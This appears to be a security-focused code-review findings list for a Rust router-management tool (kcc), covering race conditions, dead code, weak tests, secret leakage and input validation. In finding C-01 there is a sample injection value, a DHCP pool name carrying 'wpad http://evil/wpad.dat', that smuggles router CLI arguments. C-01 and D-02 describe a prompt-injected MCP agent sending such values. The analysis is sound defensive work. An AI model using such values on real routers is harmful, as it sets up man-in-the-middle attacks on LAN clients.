Refuted part: the `auth = auto` plus `token_file` "drift". `convert_config_profile` (`registry.rs:820-823`) maps `Auto` with a token file to `Token` before the registry validates, so both layers accept the same input.

B-14.title: Audit module: duplicated helpers, dead state and unused public API
B-14.impact: More surface area, and readers are misled about where the chain state comes from.
B-14.fix: Delete the dead builder and fields, reuse one reader and one JSON-error mapper, and gate test-only constructors behind a test feature.
B-14.reasoning: `read_entries` duplicates `read_file` in a loop. `json_error` duplicates `corrupt_json`. The chain fields set at spawn time are overwritten at the top of every `append_locked`. `with_append_lock_backoff` has no caller at all. `spawn_with_limit` and `light_rounds` are only used by tests (`light_rounds` also by `kcc-telemetry` tests). One small correction: `open_with_retention` is also the body of production `JobRunner::open` (`jobs.rs:261`). Only its direct public use is test-only.

B-15.title: Audit retention runs only on rotation and only on whole files, unlike its documentation
B-15.impact: On a quiet install, archives older than `retention` stay until the next rotation, which may be months away at 50 MiB, and the active file is never pruned.
B-15.fix: Correct the doc, or also prune at spawn time and on a timer.
B-15.correction: This is a rustdoc wording fix only. The user docs match the code.
B-15.reasoning: The behaviour is as described, but the user documentation already says it accurately. `CONFIG.md:121` reads "maximum age of complete rotated audit files", and `PRIVACY.md:26` says such files "are pruned after rotation". Only the rustdoc line at `settings.rs:272` is imprecise.

B-16.title: `glob_matches` claims to be kit-compatible but is not
B-16.impact: A custom role scoped `Lab-*` gets MCP tools listed by the kit for `lab-1`, then every kcc `authorize` refuses it. An empty scope means "all routers" here and "none" in the kit.
B-16.fix: Match the kit (case-insensitive, empty means none, with the CLI passing `["*"]`), or fix the comment.
B-16.correction: Fix the comment. The behavioural impact needs state-file tampering.
B-16.reasoning: The semantics do differ: the kit is case-insensitive and treats an empty list as matching nothing. But the divergence cannot be reached through supported paths. `load_roles` refuses empty scopes for custom roles (`permissions.rs:204`). Web-created globs are limited to `[a-z0-9-*]` (`valid_glob`). Router ids are lowercase-only. The empty-means-all rule only serves `[cli] router_scope`, which never reaches the kit. The `Lab-*` scenario needs a hand-edited `roles.json`.

B-17.title: Poller idle-exit race can hand out a receiver that never gets data
B-17.impact: A `subscribe` that runs between the count and the removal (the `.await` on the lock yields) gets `sender.subscribe()` from the channel that is about to be dropped. That subscriber's `changed()` fails at once and no data ever arrives, although a fresh subscribe would have started a new task.
B-17.fix: Re-check `receiver_count()` while holding the `channels` lock before removing the entry.
B-17.reasoning: `run` reads `receiver_count()` and `metrics`, then awaits `channels.lock()` before removing the entry. `subscribe` can take the lock in between and hand out `sender.subscribe()` from a channel that is about to close. The consequence is worse than stated for metrics: `subscribe_metrics` can lose the same race, and the telemetry `follow` task returns on `changed()` error and never resubscribes. That router's metrics would then stop until it is watched again. The window is narrow (only at the idle timeout).

B-18.title: More private async functions lack cancel-safety annotations than BACKLOG lists (KNOWN-BACKLOG)
B-18.rule: RUST_GUIDELINES.md §5 "Annotate every async fn with cancel safety" (line 1188)
B-18.impact: The backlog count understates the gap. `run` is a spawned task that runtime shutdown can abort.
B-18.fix: Add the annotations and update the BACKLOG list.
B-18.correction: Treat it as a correction to the BACKLOG list, not a new finding.
B-18.reasoning: The functions do lack annotations. But `BACKLOG.md:77` already tracks this exact class and its fix ("add the comments and extend the check to `pub(crate)` and private functions"). The finding only adds instances to a known item.

B-19.title: A write job with no router fails as "router busy: missing"
B-19.rule: RUST_GUIDELINES.md §3 "Use enums instead of boolean parameters" (line 511)
B-19.impact: A programming error reaches users as a busy router named "missing". `(Option<String>, bool)` allows a combination that should not exist.
B-19.reasoning: The code is as quoted. It is only reachable through a programming error (a `write = true` call with no router), and none is shown. It is a type-design nit under §3 "Use enums instead of boolean parameters", with no user-visible cost today.

B-20.title: Workflow audit entries use timestamps as request ids, and terminal changes drop their audit receipt
B-20.impact: Two changes in the same second share a "correlation" id, and none can be joined to the front-end request that caused it. Reboot and factory-reset callers cannot tell the user that the audit entry is still pending.
B-20.fix: Pass the caller's request id into the `ChangeSet`, and keep `audit` on `TerminalCliChangeResult`.
B-20.correction: Keep the request-id issue. The dropped field does not stop callers from reporting a pending entry.
B-20.reasoning: Request ids are `change-{unix_seconds}`. They collide within a second and are not tied to the front-end request, so that half is confirmed. The receipt half is mostly wrong. `From<CliChangeResult>` does drop `audit`, but reboot and factory-reset callers hold the `&mut ChangeSet` (`system.rs:201-210`), and the front ends report pending entries through `ChangeSet::audit_pending()` (`page_kit/change.rs:433,474`, `cli/change.rs:245`).

B-21.title: One malformed backup file turns off retention for that router permanently
B-21.impact: Every later create warns, nothing is pruned, backups pile up past `keep_last` and `max_age`, and `list()` fails for the Web and CLI.
B-21.fix: Skip or quarantine unreadable entries during listing and retention, and report them separately.
B-21.reasoning: One unreadable `.txt` fails `list_unlocked`, and through it `list` and retention. `create` only logs a warning. Reachability is narrower than implied: `write_exclusive` is atomic (temp file, fsync, hard link), so a crash cannot leave a torn record. Only a corrupt or foreign `.txt` placed in the directory triggers it. Once triggered, the effect is permanent.

B-22.title: The two-group env-override macro adds structure nothing needs
B-22.impact: Every new row forces a meaningless choice of group. A single table followed by one `normalize_suffixes` call gives the same configuration.
B-22.fix: Collapse to one row list and normalize once after `apply_rows`.
B-22.reasoning: The split reproduces the pre-refactor order exactly (`normalize_suffixes` sat between the two groups in the deleted code). It keeps which error is reported first when a bad suffix and a later bad variable are both set. On success, the configuration is the same either way. It is a defensible choice that preserves behaviour, not a speculative abstraction.

B-23.title: Several tests cannot fail, describe the wrong failure, or wait in real time
B-23.impact: These tests give coverage that is not there; the spin loop and the prose pin are brittle.
B-23.fix: Cancel after the reservation (hold `write_jobs` instead), force a collision with `for_test` allocators, rename the misleading test, wait on the watch signal, and assert on a structured field.
B-23.reasoning:
Each claim checks out:
  - The cancelled start is dropped at the first `active.lock().await`, before any reservation, so the test cannot fail.
  - Both runners share the pid, timestamp and sequence 1, so `assert_ne` holds only because of the 4 random entropy bytes.
  - The directory named `audit-…0001.jsonl` makes `verify_files` fail (EISDIR on read) before any rotation, so "forced rotation failure" is the wrong name.
  - The poller test spins on `yield_now` against a real-time `Instant`, and this file is not in the `BACKLOG.md:84` list.
  - `tests/backups.rs:231` asserts log prose.

B-24.title: A route transition on a `kcc.toml` router keeps the new URL only in memory but rewrites the operator's password file
B-24.impact: After a migration moves a `kcc.toml` router, the next SIGHUP reload (which the README asks for after `kcc apikey create`) reverts to the old URL (`registry.rs:708-721`), while the operator's file already holds the new password. Half the transition is persisted.
B-24.fix: Refuse URL transitions for config-defined routers, or persist neither change and report the required `kcc.toml` edit.
B-24.reasoning: For a `kcc.toml` router, `store.update` finds no state entry, so the new URL lives only in memory. `replace_password` deliberately rewrites the operator's `password_file` (documented at `registry.rs:325-327`). Any reload or restart (not only SIGHUP) rebuilds the profile from `kcc.toml` with the old URL, while the file already holds the new password. No message tells the operator to edit `kcc.toml`.

C-01.title: Unquoted free text in DHCP and client CLI lines lets a Write principal inject router CLI arguments
C-01.rule: project rule (b) "Raw RCI input is validated before sending"; RUST_GUIDELINES.md §10 "Validate and sanitize all external input at system boundaries" (2732)
C-01.impact: The domain renders pool subcommands inline (`ip dhcp pool {pool} range …`), so the router accepts arguments after the pool name. Suppose a prompt-injected MCP agent with only Write sends the DHCP `pool` op with `name = "_WEBADMIN wpad http://evil/wpad.dat"`. The first line sent is then `ip dhcp pool _WEBADMIN wpad http://evil/wpad.dat`, which pushes WPAD (or a DHCP `option`) to every LAN client. That is a man-in-the-middle setup that no curated op offers, sent without RawRci and without a catalog check. `verification::complete` accepts it because the line parses as a single row.
C-01.fix: Quote these values with `cli_token::quoted` (as wifi, wan and mesh do), or reject them with `cli_token::validate`. Make `plan_static_lease` take a typed MAC.
C-01.correction: Reachable only through MCP (and through the CLI by its own operator). It adds arguments inside the pool/host/known-host commands, not separate commands. Two more MCP holes have the same root cause: `plan_client` passes `input.value` as the registration name with no check at all (`clients.rs:156`), and the static-lease `mac` is a plain `text()`. Fix as proposed: `cli_token::quoted` or `validate`, plus a typed MAC.
C-01.reasoning:
- **How the value travels.** MCP `dhcp` op `pool` takes `name` through `text()`. That check only refuses empty values, control characters and more than 256 characters, so spaces and quotes pass. The catalog types `ip dhcp pool name`, `ip dhcp host host` and `known host name` as `String`, and `valid_argument` only checks `is_string()` for that type. `cli_line` then pastes the value unquoted. `CliCommand::new` checks no grammar, and `expose_for_send` refuses only control characters. `verification::complete` accepts the line because it still parses as one row. `dispatch_cli` sends it.
  - **What an attacker can do.** A name like `_WEBADMIN wpad http://x/wpad.dat` makes the first line `ip dhcp pool _WEBADMIN wpad …`. The domain's own `ip dhcp pool {pool} range …` rendering shows the router takes subcommands on the same line. That reaches catalogued pool subcommands no curated op offers (`wpad`, `option`, `bootfile`, `next-server`), which otherwise need `RawRci`. The attacker needs `Write` on the router, with the `dhcp` toolset enabled. No `confirm` is needed because the risk is `Write`.
  - **Where it stops.** It cannot start a new command: newlines and control characters are refused, and nothing shows `;` works. The `known host` and `ip dhcp host` tails can only add arguments to those commands.
  - **Why it is not high.** The Web UI is not affected: pool names go through `is_word`, client names through `is_name`, and MACs through `mac_address`. The CLI runs as the operator's configured role. A `Write` principal can already redirect LAN DNS through the curated DNS writes (`name_server`, `static_host`, upstreams), so the WPAD man-in-the-middle example is not a new kind of capability. What it does add is a bypass of the curated/RawRci boundary within one command's arguments.

C-02.title: The bracket's disarm runs the full write preflight, so a local refusal blocks cleanup and is reported as "may be armed"
C-02.rule: overlay keenetic-control-center (owner's bracket invariants "disarm always attempted" and "a failure never reads as armed when the timer is off", `bracket.rs:9-23`)
C-02.impact:
- Another agent edits the router after the change set starts. The arm is refused locally with Conflict, and so is the disarm. Nothing was sent, but the user is told a rollback timer may be counting down. The same happens with a failed backup download.
  - A foreign edit during the work makes the disarm fail its conflict check, so it is never sent. The router timer then fires after 300 s and discards all unsaved changes, including the other admin's.
C-02.fix: Send the disarm (and keep-alive) through a path that skips the conflict and backup preflight and keeps the authorization. Have `arm_failed` report `None` when the arm failed before anything was sent.
C-02.reasoning: Arm, disarm and keep-alive all go through `apply_cli`, so each one runs `prepare_cli` (authorize, then `check_conflict`, then `ensure_backup`). If the arm is refused locally (a Conflict, or a startup download or backup write that fails), the disarm hits the same refusal before sending anything. `arm_failed` then returns `ArmedFate::NotSent`, whose message says "may still be counting down" although nothing was sent. That breaks the invariant documented at `bracket.rs:19-23`. Separately, a foreign edit during the work makes the disarm fail `check_conflict`. The timer then fires and discards every unsaved change, including the other admin's. That case is at least reported as armed. Neither case is in the BACKLOG.

C-03.title: `guarded` replaces and then cancels a recovery timer the operator armed earlier
C-03.impact: An operator arms `kcc config failsafe arm 3600` as a safety net, then makes a management change in the Web UI. The bracket resets the timer to 300 s and then sends `no system configuration fail-safe timer`, so the operator's net is silently gone. In scheduled-reboot mode, `no system reboot` likewise cancels a reboot the operator scheduled.
C-03.fix: When the baseline shows `fail-safe.active == true`, either refuse the bracket or run the work without arming or disarming and leave the existing timer to its owner.
C-03.reasoning: `guarded` never checks whether `baseline().fail_safe.active` is `true`. It arms for 300 s and always sends `no system configuration fail-safe timer` (or `no system reboot`). The cancellation is certain whatever the router does with a second arm. It also crosses a permission line: a timer that needs `Destructive` to arm (`kcc config failsafe arm`, SECURITY.md:141) is silently cancelled by a bracket authorized only by `Write`.

C-04.title: Generic interface reads pass `show interface` credential blobs (ns3) through `extra`
C-04.rule: project rule (d) "Secrets … never reach logs, … tool results, error text or Debug output"
C-04.impact: `kcc interfaces list --json` prints PPPoE passwords and Wi-Fi PSKs in a decodable form, without the `RevealSecrets` permission. MCP is protected only by the key-name redaction in `kcc-mcp/src/support/shape.rs:207-236`.
C-04.fix: Drop `authentication` from `Interface` at the read boundary, as WAN and Wi-Fi already do.
C-04.correction: The real issue is a rule-(d) secret in CLI output (`--json` or a terminal paste), conditional on the firmware returning the blob. It is not a privilege escalation. The fix stands: drop `authentication` at the read boundary.
C-04.reasoning:
- **The leak is real.** `Interface` flattens every unknown field into `extra`, and the WAN and Wi-Fi models drop `authentication` on purpose. The planners' own read-back (`MarkerOrLengthRange{24,256}` on `show interface …/authentication/…/ns3`) expects a real router may return the blob. `kcc interfaces list|show` prints it with only `Read`.
  - **The impact is smaller than claimed.** MCP redacts by key name (`ns3`, `password`, `psk`). The Web UI renders only modelled keys (`mac`, `mtu`, `mask`). Calling it a `RevealSecrets` bypass overstates it: the CLI role comes from `kcc.toml` and is used by the same OS user who can read `master.key` and the sealed credentials.

C-05.title: Management detection blocks on DNS inside async code and quietly falls back to Write
C-05.rule: RUST_GUIDELINES.md §5 "DON'T: Call blocking I/O in async functions" (1112); overlay project rule (a) "each target is resolved once and pinned"
C-05.impact: For a router registered by host name, every check does a blocking `getaddrinfo` on a tokio worker thread. The result can also differ from the pinned address the client actually uses. If DNS fails or ARP and hotspot reads fail, the verdict becomes `Unknown`, which is plain `Write` for any bridge other than `Bridge0`. Taking down the bridge kcc uses then runs with no recovery timer.
C-05.fix: Use the client's pinned peer address instead of re-resolving. Treat an empty host set or empty evidence as Management for every bridge, not only `Bridge0`.
C-05.reasoning: `router_hosts` calls the blocking `ToSocketAddrs::to_socket_addrs` inside `async fn detect`, once for each name `classify_generated` finds. kcc-rci itself resolves inside `spawn_blocking` and pins the result (`outbound.rs:195`), so the domain code is inconsistent and can use different addresses. With no resolved hosts and no ARP or hotspot evidence, the verdict is `Unknown`, which counts as `Write` for any bridge other than `Bridge0`.

C-06.title: Several WAN planners hard-code `Risk::Write` even on the interface that carries management
C-06.impact: When kcc manages a router over its PPPoE WAN address, `no interface PPPoE0 ipcp default-route`, a bad MTU or wrong PPPoE credentials cut kcc off with no recovery timer. The unsaved change stays until someone power-cycles the router.
C-06.fix: Classify these the same way as `plan_priority` (`plan_named_generated`), or take a `ManagementVerdict`.
C-06.reasoning: `plan_identity`, `plan_password`, `plan_connect_via`, `plan_mtu` and `plan_default_route` fix `Risk::Write`. In the same module, `plan_dhcp`/`plan_static_address` use `verdict.risk(name)`, and `plan_priority`/`create`/`delete` use `classify_generated`. Callers take the risk from the plan, so no guard elsewhere raises it. The failure needs kcc to manage the router over that interface, an uncommon but supported path.

C-07.title: Validated requests are overwritten after validation, bypassing the catalog check
C-07.rule: project rule (b); RUST_GUIDELINES.md §3 "Force construction through validated constructors" (424)
C-07.impact: For the proxy upstream, `protocol` and `host` reach the router CLI checked only by `validate_token`. Any host, including non-LAN or metadata addresses, can become a published KeenDNS upstream, although the docs say "one LAN host". The rendered shape (`upstream <protocol> <host> <port>`) also does not match the catalog grammar.
C-07.fix: Validate the real body. Where the catalog shape is wrong, fix the catalog overlay instead of mutating `ValidatedRequest.value`. Make that field read-only in kcc-catalog.
C-07.correction: This is a weakened catalog check with single-token inputs, not a route to arbitrary router input.
C-07.reasoning: The pattern is real: the code validates `{}` and then overwrites `ValidatedRequest.value`, which is a public field. But the security-level values come from typed enums (`level.name()`), so nothing can be injected there. For the proxy upstream, `protocol` and `host` must each pass `cli_token::validate` (one token with no whitespace or quotes), and the router parses them. The real leftover is that MCP and CLI accept any single-token host, while the Web UI requires an IPv4 address and the docs say "one LAN host".

C-08.title: `parse_pools` attaches indented lines of later blocks to the last DHCP pool
C-08.impact: A later block such as `ipv6 subnet Default` with `    bind Bridge0`, or any block with an indented `enable`, overwrites the last pool's `interface` or `enabled`. The DHCP page then shows the wrong binding. `plan_static_lease` (`dhcp.rs:130-135`) also runs its subnet check against the wrong bridge, so it wrongly accepts or refuses leases.
C-08.fix: Clear the current pool on any non-indented line that is not an `ip dhcp pool` header.
C-08.reasoning: A top-level line never closes the current pool, and the field match only needs the line to start with a space. Any later block with an indented `bind X`, `enable` or `dns-server …` overwrites the last pool. `ipv6 subnet Default` with `bind Bridge0` is the likely case. Whether such blocks really come after the pools on a real router is inferred; no fixture contains pool blocks.

C-09.title: `plan_pool` silently drops every DNS server after the first
C-09.rule: project rule (c) "Every curated write is read back and compared"
C-09.impact: An operator enters two DNS servers. Only the first is written, read-back checks only that line, and the change is reported as applied.
C-09.fix: Refuse more than the catalog supports (`address1` only), or render all of them.
C-09.correction: The reachable path is `kcc dhcp pool … --dns A --dns B`, not the Web UI.
C-09.reasoning: `plan_pool` renders only `dns_servers.first()`. The cited Web form cannot trigger this, because it wraps a single address (`vec![server]`), and MCP sets no DNS servers at all. The CLI does trigger it: `--dns` is a `Vec<Ipv4Addr>` documented as "repeat for several", and every server after the first is silently dropped. The read-back then passes.

C-10.title: Partition check and format can never work, yet ship in Web, MCP and CLI
C-10.impact: Every surface offers storage maintenance that always fails, and the tests lock in that failure.
C-10.fix: Map to the real `media partition …` paths, or remove the feature.
C-10.correction: This is dead code under a wrong path name. Only MCP and CLI expose it; the Web UI hides it.
C-10.reasoning: The paths are wrong, so the operations can never run. But the Web UI does not offer them: the availability filter hides them, by documented choice (`storage.rs:5-8`), and their routes refuse through catalog validation. MCP and CLI still expose ops that always fail. The module doc's premise is half wrong, because 5.1 does have `media partition check|format`. The test pins the refusal on purpose, not by accident.

C-11.title: The component commit job reports "completed" before the router reboots
C-11.impact: A real router keeps answering while it downloads and flashes. The job finishes at once with `after_firmware` and `after_components` equal to the old state, and then the router reboots. The test (`tests/components.rs:57-73`) checks a fresh `poll_info` after the job ends, not the job's own report, so it passes anyway.
C-11.fix: Require one failed probe (down) before accepting a successful one, and compare the components against what was staged.
C-11.reasoning: The first successful `poll_info` after `components commit` ends the job as `completed`, with `after` taken from a router that has not rebooted yet. Nothing waits for a down→up transition or compares the components with what was staged. The probe window is also only 40 × 250 ms = 10 s, so even a quick reboot would make the job fail instead of waiting. The test checks a fresh `poll_info`, not the job's payload.

C-12.title: Changing the listener kcc itself uses always rolls back the router
C-12.impact: If kcc connects on that port or scheme, the verification and the disarm both fail. Redirects are refused by outbound policy. The router timer then restores the saved configuration and discards every unsaved change, not only this one. The operation can never succeed, but the planner still accepts it.
C-12.fix: Refuse it in the planner when the target listener is the one in the router profile's URL, or document that a profile edit must come first.
C-12.correction: This is a usability gap. A planner pre-check against the profile URL would avoid a rollback the user can predict; correctness is not broken.
C-12.reasoning: If the router applies the change at once, the read-back and disarm over the old endpoint fail. The timer then restores the saved configuration and the failure is reported as armed (`Failure::armed` or `ArmedFate::Unknown`). That is the bracket doing its documented job for a change that cuts kcc off, not a misreport. Other claims overreach: it is not "always" (it only applies when the change hits the listener kcc uses), and whether open keep-alive connections survive the change is unverified.

C-13.title: Local planning errors are reported as "invalid router response"
C-13.rule: RUST_GUIDELINES.md §2 "Propagate errors with `?`" (228); BRIEF §4 "swallowed or downgraded errors"
C-13.impact: A catalog `Validation { issues }` or an `InvalidCliToken` from the arm, reboot or client/DHCP plan reaches the user as a router failure, with the issues thrown away. Inside the bracket, a locally refused arm reads as a transport-level failure.
C-13.fix: Add a `WorkflowError` (or domain) variant that carries the planning error. Build the arm body from typed `seconds` instead of re-parsing the line.
C-13.reasoning: The `map_err(|_| InvalidResponse)` pattern is there. In practice, though, the lost errors are almost always `InvalidResponse` already: the `cli_line` and `complete` errors are themselves `InvalidResponse`, and every catalog has the arm and reboot paths, so `Validation{issues}` is lost only in theory. The format-then-reparse of `seconds` is ugly but correct; BACKLOG:85 tracks its missing test.

C-14.title: Module- and crate-wide `#[expect]`s hide real defects
C-14.rule: AGENTS.md "No `#[allow]` … `#[expect]` on the narrowest item"; RUST_GUIDELINES.md §9 "Satisfying the profile" (2054-2055, 2090)
C-14.impact: New public functions in these modules ship without `# Errors` docs or `#[inline]` and nobody is warned, and the lint that would have caught the dead parameters is silenced.
C-14.fix: Delete the dead parameters, write the `# Errors` sections, and put any remaining expectation on the single item that needs it.
C-14.reasoning: Module- and crate-level `missing_errors_doc` and `missing_inline_in_public_items` expects go against "narrowest item" and "Production code … writes the sections". The parameters `_rci_path: Vec<&str>` and `_name` really are dead. But the link to the expects is weak: underscore-prefixed parameters are already hidden from the unused-variable lints, whatever the expects say.

C-15.title: `close(Save)` in router mode sends a second save after the commit and can misreport the result
C-15.impact: If the redundant save fails (for example a Conflict from its own pre-check), the CLI says `MIGRATE_COMMITTED_NOT_SAVED` (`kcc/src/cli/closing.rs:39-41`) although the startup config is already saved.
C-15.fix: Drop the second save in router mode, or verify `unsaved == false` instead.
C-15.reasoning: `commit()` already waits until `unsaved == false` before returning. The following `save()` repeats its own conflict check and a request. If that save fails, the result is `Failure::committed`, which the CLI reports as `MIGRATE_COMMITTED_NOT_SAVED` ("startup configuration was not saved") although the commit already saved it. The behaviour is documented in `close.rs:56-57`, but the wording is still false.

C-16.title: `close` doc gives the wrong fate for a failed keep-unsaved
C-16.impact: Callers that follow the doc show "configuration saved" for a run that was never saved.
C-16.reasoning: The doc is wrong: a failed keep-unsaved disarm gives `ArmedFate::Applied`, not `Saved`. But every caller branches on `fate()`/`applied()` (CLI `(_, true, true)` gives Applied; migrate gives `DisarmFailed`), so nothing shows "saved". The impact claim is hypothetical.

C-17.title: The same helpers are copied across planners
C-17.impact: A fix to the token rules or the escaping has to be found and applied up to seven times. The copies can already drift: the `ValidatedRequest` refusals behave differently from module to module.
C-17.fix: Move them into `cli_token`, `descriptor` and one `pointer::escape` helper.

C-18.title: Production code that only tests use, or that does nothing
C-18.rule: BRIEF §4 "dead or test-only code shipped in production", "string matching on error names"
C-18.impact: Extra public surface, an extra router request on every management interface change, and a check that is never true in production.
C-18.fix: Delete them, or move them to test support.
C-18.reasoning: The functions are used only by tests, and `guard::apply` repeats a `show last-change` that `apply_cli` has already done. One correction: `is_fail_safe_unarmed` could be true in production (an arm verification failure converts through `From<WorkflowError>`); it is simply never called.

C-19.title: Diagnostics poll the router every 10 ms
C-19.impact: An iperf3 or traceroute job sends about 50-100 GETs per second for its whole run. That loads the router's HTTP daemon, skews the iperf3 measurement it is running, and takes request permits from other work on the same router.
C-19.fix: Keep the default interval in production and shorten it only in tests (or use a paused clock).
C-19.reasoning: The diagnostics job polls every 10 ms (plus the round trip) instead of the 1 s default, for the whole iperf3 or traceroute run.

C-20.title: Schedule descriptions cannot contain spaces
C-20.reasoning: Refusing spaces is a documented, tested choice ("The router's CLI takes a schedule's … description as one word each"). It is only a bug if that premise is wrong. The catalog types it as `String`, and interface descriptions are sent quoted, so the premise looks doubtful but is not disproven.

C-21.title: The bracket reports refusals with the wrong error and drops an audit failure
C-21.impact: A request that is no longer held is logged as a dead audit writer. On the arm-failure path, an audit writer failure is thrown away silently, unlike the main path (`131-135`).
C-21.fix: Add a dedicated "unowned" variant, and fold the settle error into the arm failure.
C-21.reasoning: An unheld request is reported as `AuditError::WriterUnavailable`. It is mostly unobservable, because the client is gone (BACKLOG:74 covers the matching 503). On the arm-failure path, the `settle_audit` error is dropped. The arm error is still returned, but an audit writer failure in that window is never reported.

C-22.title: Read-back of secret writes passes when an old secret is already there
C-22.impact: A router that acknowledges but ignores a password or PSK change still passes verification whenever a previous secret exists.
C-22.fix: Read the hash or marker before the write and require it to change.
C-22.reasoning: Every secret write is checked for presence only. For Wi-Fi and WAN the user is told so ("kcc checks only that it is there"). Comparing the hash or marker before and after the write would catch an ignored write without revealing the value.

C-23.title: Client and DHCP read-back runs after the audit entry says "success"
C-23.impact: A failed host or lease read-back returns `VerificationFailed`, but the audit log still records success.
C-23.reasoning: The audit outcome for these change-settings commands is `applied_unsaved`, not `success`. Also, `verification::complete` adds running-config presence checks before the audit for DHCP always, and for clients unless a policy command is in the batch. So the gap is only the extra post-audit read-back (`show rc ip dhcp host` / `show ip hotspot`), plus client host lines that are batched with a policy command, which get no check before the audit.

C-24.title: `plan_tag` does not protect the login kcc uses
C-24.impact: Removing `http` from, or adding `readonly` to, kcc's own login locks kcc out. The recovery timer then rolls back all unsaved changes.
C-24.fix: Take `profile_login` and refuse tag changes that would remove kcc's own access.
C-24.reasoning: `plan_tag` protects only the literal `admin` against losing `cli`; `plan_password` and `plan_delete` protect the profile's login. The plan is `Risk::Management`, so if kcc locks itself out, the bracket's timer reverts it. The cost is losing unsaved work, not a permanent lockout. Which tags actually gate RCI access was not verified.

C-25.title: Tests that cannot fail or miss the behavior they name
C-25.impact: Regressions in factory-reset gating, the commit report (C-11) and planner paths that do not exist (C-10) pass the tests.
C-25.fix: Call `factory_reset` against the fixture, assert the job's progress payload, and fail on registry writes the catalog does not have.
C-25.reasoning: The `FakeRouter` in `system.rs` is built but never spawned or used, and the test checks a pure function, so `request_count() == 0` cannot fail. The other three examples hold as stated.

D-01.title: Clearing a firewall rule's description or schedule sends "enable rule"
D-01.rule: project rule (c) "every curated write is read back"; RUST_GUIDELINES.md §3 "Use exhaustive `match`" (547)
D-01.impact: An operator clears the description (or picks "no schedule") on a disabled rule, for example a disabled permit rule. kcc sends `no access-list L rule N disable`, so the rule becomes active and the description stays. The Web `Expect::Property` read-back then fails, but the router has already changed: a firewall rule was turned on without anyone asking. No test covers `Description(None)` or `Schedule(None)`.
D-01.fix: Render the property from the `RuleProperty` variant, not from which JSON fields happen to be present. Clearing should render `no access-list L rule N description` or `no access-list L rule N schedule`. Add a test that clears the description on a disabled rule and checks the rule is still disabled.
D-01.correction: The rule is enabled, unrequested, every time. The read-back fails only when a value existed before. When the dialog is saved with nothing to clear (the default empty field, or "no schedule" on a rule without one), the enable is silent and is audited as success. Fix as proposed: render `no access-list L rule N description|schedule`. Add a test for clearing on a disabled rule, both with and without a prior value.
D-01.reasoning:
- **What is sent.** `Description(None)` and `Schedule(None)` both build `{"index":N,"no":true}`. The catalog accepts `no` because `prefix_no` is true. `render_property` finds no `description`, `schedule` or `order` field, so it falls through to `disable`. `line()` then adds the `no ` prefix, and the router receives `no access-list L rule N disable`, which re-enables the rule. The documented clear form is `no rule <index> (disable | schedule | description)`.
  - **Web reaches it.** An empty or whitespace description gives `checks::description` → `Ok(None)` → `lines::description(.., None)`. The schedule dialog's "no schedule" choice `""` gives `picked = None` → `lines::schedule(.., None)`. The CLI never builds `None`, and MCP refuses `description`/`index`.
  - **The read-back does not always fail, contrary to the finding.** `Expect::Property` only compares description or schedule with `None`. If the rule had no description (or no schedule), saving the dialog as it is enables a disabled rule, and the read-back passes silently.

D-02.title: Names and free text go into CLI lines unquoted and unvalidated
D-02.rule: project rule (b) "raw input validated against the catalog and the identifier validators"; RUST_GUIDELINES.md §10 "Validate and sanitize all external input at system boundaries" (2732)
D-02.impact: An MCP client (a prompt-injected agent) sends `fqdn_group` with description `Streaming services`, or an `acl`/`name` containing spaces. kcc sends a line whose words differ from the catalog-validated body, for example `object-group fqdn G description Streaming services`. Descriptions with spaces cannot be set, and the caller controls extra CLI words inside a line kcc reports as validated.
D-02.fix: Run every identifier through `ObjectName` or `cli_token::validate` in the planner, and put every free-text value through `cli_token::quoted_text`, as the firewall rule description already does. Validate the context names (interface, map, group) against the catalog as well.
D-02.correction:
Limit the sinks to MCP and CLI input: ACL name, DNS names and descriptions, VPN context names and peer keys, crypto-map names, and policy description. Remove firewall schedule and interface from the list, and replace the FQDN-description example with the one above.
  - **Possible extra impact (inferred).** `list_risk` matches `acl == list` against bindings. An `acl` containing spaces matches no binding, so the plan is classified `Write`, while the router would act on the first word of the list name. Whether the router accepts the trailing words is unverified.

D-03.title: Setting an FQDN group description is always refused
D-03.impact: MCP `fqdn_group` with a description (`kcc-mcp/src/domains/write/dns.rs:152`) and the CLI (`kcc/src/cli/dom_dns.rs:172`) always fail with a validation error. No test covers it.
D-03.fix: Validate `{"description"}` only and carry `name` outside the validated value, as `FqdnInclude` does. Add a test.
D-03.reasoning: The body `{"name","description"}` against arguments `{description}` with no children makes `name` an `UnknownField`. On 4.3 the path does not exist at all. Nothing in any test or Web caller exercises the variant.

D-04.title: Clearing a connection-policy description always fails
D-04.impact: The Web policy description dialog with an empty field (`kcc-web/src/routing_page/policy_forms.rs:154`) goes through `apply::apply` → `render::request` → `expected_leaf`, which returns `InvalidResponse`. Removing a description is impossible from any surface.
D-04.fix: When `no` is set, render `no ip policy N description` without an argument.
D-04.reasoning: With `None`, the body is `{"no":true}`. `leaf_line` then calls `expected_leaf`, where `text(request,"description")` fails with `InvalidResponse`. Web (empty field → `None`), MCP and CLI all reach this. It fails before `apply_cli`, so nothing is sent; the only cost is that a description can never be cleared.

D-05.title: Ports are rendered for ICMP/ESP/GRE/IPIP/IP firewall rules, and the test matrix accepts it
D-05.rule: project rule (b); RUST_GUIDELINES.md §3 "Force construction through validated constructors" (424)
D-05.impact: An MCP firewall call with `protocol: ip, port: 443` sends `access-list X permit ip … port eq 443`, a line outside the documented grammar. The fake router accepts it, so the matrix pins an invalid command as correct.
D-05.fix: Refuse ports unless the protocol is TCP or UDP, either in `plan_rule` or by making `Rule` carry ports only for TCP/UDP. Drop those cells from the matrix, or assert the refusal.
D-05.reasoning: The `Rule` port fields are public and nothing checks them against the protocol. MCP `Transport::Ip`/`Icmp` with a `port` renders `… ip … port eq N`. The matrix test adds ports to `Icmp` and `Ip` and expects that line to reach the fake router. Whether a real router rejects it is inferred from the documented grammar.

D-06.title: One unparsable rule makes every CLI/MCP firewall write fail, after the write
D-06.impact: The router holds `access-list Other permit tcp … port gt 1024` (written by the router's own UI, or the earlier form `rule_words.rs` documents). Every `firewall::change::apply` on any list then returns `InvalidResponse`. For an Add, the line was already sent, so a successful change is reported as failed. This is related to the two-readers item in BACKLOG ("Known gaps", firewall reader entry) but is a separate failure mode. Tagged KNOWN-BACKLOG-adjacent.
D-06.fix: Parse only the targeted list, and keep unknown forms as "unstructured" entries instead of failing, as `rule_words::StoredRule` does.
D-06.reasoning:
- **Mechanism.** One unparsable row in any list makes `configured_rules` return an error. Triggers include `port gt/lt` (the `[keyword, ..] if keyword == "port"` arm) and any row that is not `permit`/`deny`.
  - **Sent, then reported failed.** `Add` has an empty preflight, so the line is sent first and verification fails afterwards. `Remove` and `Property` fail in preflight, before anything is sent.
